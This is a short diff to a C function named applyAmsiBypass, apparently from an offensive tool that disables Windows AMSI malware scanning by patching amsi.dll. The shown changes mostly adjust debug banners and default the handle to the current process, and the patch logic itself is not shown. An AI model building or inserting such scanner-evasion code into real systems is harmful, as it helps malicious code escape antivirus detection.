@@ -1,7 +1,10 @@
 #include "amsi_bypass.h"
 
 BOOL applyAmsiBypass(HANDLE hProcess) {
-    DebugPrint("\n<============= AMSI Bypass [PID - %d] =============>\n");
+    if (hProcess == NULL)
+        hProcess = NtCurrentProcess();
+
+    DebugPrint("\n<========     AMSI Bypass [PID - %d]     ========>\n", GetProcessId(hProcess));
     
 #if defined(JNE_BASED_AMSI_PATCH)
     if (!LoadLibraryA("amsi.dll")) {
@@ -29,11 +32,11 @@ BOOL applyAmsiBypass(HANDLE hProcess) {
     DebugPrint("[+] AMSI Bypass applied successfully using JNE patch!\n");
 #else
     DebugPrint("[!] No AMSI Technique selected\n");
-    DebugPrint("<===============================================>\n\n");
+    DebugPrint("===================================================>\n\n");
     return TRUE;
 #endif
     
     DebugPrint("[+] AMSI Bypass applied successfully!\n");
-    DebugPrint("<===============================================>\n\n");
+    DebugPrint("<===================================================>\n\n");
     return TRUE;
 }
